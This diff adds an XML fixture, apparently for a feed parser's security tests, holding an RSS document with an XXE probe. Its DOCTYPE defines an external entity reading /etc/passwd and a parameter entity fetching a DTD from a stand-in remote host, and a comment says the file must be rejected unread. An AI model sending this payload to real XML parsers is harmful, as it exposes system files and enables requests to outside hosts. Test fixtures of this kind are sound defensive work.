@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XXE probe: an external entity from a local file and a parameter entity from a remote DTD. Must be rejected unread. -->
+<!DOCTYPE rss [
+  <!ENTITY local SYSTEM "file:///etc/passwd">
+  <!ENTITY % remote SYSTEM "http://xxe-probe.invalid/evil.dtd">
+  %remote;
+]>
+<rss version="2.0">
+  <channel>
+    <title>Alerts</title>
+    <item>
+      <title>&local;</title>
+      <link>https://news.example/a</link>
+      <pubDate>Wed, 04 Nov 2026 08:10:00 GMT</pubDate>
+    </item>
+  </channel>
+</rss>
